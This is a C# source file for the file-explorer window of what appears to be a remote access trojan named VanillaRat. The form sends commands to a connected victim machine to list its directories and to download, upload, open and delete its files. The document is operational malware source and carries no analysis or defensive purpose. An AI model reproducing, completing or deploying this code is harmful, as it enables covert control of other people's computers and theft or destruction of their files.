using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class FileExplorer : Form
    {
        public string CurDir;

        public FileExplorer()
        {
            InitializeComponent();
            MinimizeBox = false;
            MaximizeBox = false;
            Update = true;
        }

        public int ConnectionID { get; set; }
        public bool Update { get; set; }

        //Switch directory if directory is selected
        private void lbFiles_SelectedIndexChanged_1(object sender, EventArgs e)
        {
            if (lbFiles.SelectedItems.Count == 0)
                return;
            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
                txtCurrentDirectory.Text = Item.SubItems[0].Text;
        }

        //Open file or directory, if file, open it client side
        private void lbFiles_DoubleClick(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count == 0)
                return;
            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
            {
                txtCurrentDirectory.Text = Item.SubItems[0].Text;
                Server.MainServer.Send(ConnectionID,
                    Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
            }
            else
            {
                Server.MainServer.Send(ConnectionID,
                    Encoding.ASCII.GetBytes("TryOpen{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text +
                                            Item.SubItems[1].Text + "}"));
            }
        }

        //Gets files in directory
        private void btnGetDirectoryInfo_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
        }

        //Manual directory input
        private void txtCurrentDirectory_TextChanged(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                txtCurrentDirectory.Text = @"C:\";
            CurDir = txtCurrentDirectory.Text;
        }

        //Go up directory
        private void btnUp_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GoUpDir"));
        }

        //Refresh listed files and directories
        private void btnRefresh_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
        }

        //Download selected file
        private void btnDownloadFile_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count == 0)
            {
                MessageBox.Show("Error: No file selected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
                return;
            if (!Directory.Exists(Environment.CurrentDirectory + @"\Downloaded Files"))
                Directory.CreateDirectory(Environment.CurrentDirectory + @"\Downloaded Files");
            TempDataHelper.DownloadLocation = Environment.CurrentDirectory + @"\Downloaded Files\" +
                                              Item.SubItems[0].Text + Item.SubItems[1].Text;
            var Stream = File.Create(TempDataHelper.DownloadLocation);
            Stream.Close();
            Server.MainServer.Send(ConnectionID,
                Encoding.ASCII.GetBytes("GetFile{[" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text +
                                        Item.SubItems[1].Text + "]}"));
            AutoClosingMessageBox.Show("Starting file download.", "Download Started", 1000);
        }

        //Upload file
        private void btnUpload_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                if (!TempDataHelper.CanUpload)
                {
                    MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                }
                else
                {
                    TempDataHelper.CanUpload = false;
                    string FileString = OFD.FileName;
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    AutoClosingMessageBox.Show("Starting file upload.", "Starting Upload", 1000);
                    Server.MainServer.Send(ConnectionID,
                        Encoding.ASCII.GetBytes("StartFileReceive{" + txtCurrentDirectory.Text + @"\" +
                                                Path.GetFileName(OFD.FileName) + "}"));
                    Thread.Sleep(80);
                    Server.MainServer.Send(ConnectionID, FileBytes);
                    TempDataHelper.CanUpload = true;
                }
            }
        }

        //Drag and drop enter
        private void lbFiles_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
            else
                e.Effect = DragDropEffects.None;
        }

        //Upload dragged file to client directory
        private void lbFiles_DragDrop(object sender, DragEventArgs e)
        {
            int MaximumFiles = 0;
            string[] File = (string[]) e.Data.GetData(DataFormats.FileDrop, false);
            foreach (string S in File)
                MaximumFiles++;
            if (MaximumFiles > 1)
            {
                MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            else
            {
                TempDataHelper.CanUpload = false;
                string FileString = File[0];
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);
                    FS.Close();
                }

                AutoClosingMessageBox.Show("Starting file upload.", "Starting Upload", 1000);
                Server.MainServer.Send(ConnectionID,
                    Encoding.ASCII.GetBytes("StartFileReceive{" + txtCurrentDirectory.Text + @"\" +
                                            Path.GetFileName(File[0]) + "}"));
                Thread.Sleep(80);
                Server.MainServer.Send(ConnectionID, FileBytes);
                TempDataHelper.CanUpload = true;
            }
        }

        //Delete file on client side
        private void btnDeleteFile_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count == 0)
            {
                MessageBox.Show("Error: No file selected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
                return;
            Server.MainServer.Send(ConnectionID,
                Encoding.ASCII.GetBytes("DeleteFile{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text +
                                        Item.SubItems[1].Text + "}"));
        }

        //On form close
        private void FileExplorer_FormClosing(object sender, FormClosingEventArgs e)
        {
            Update = false;
        }
    }
}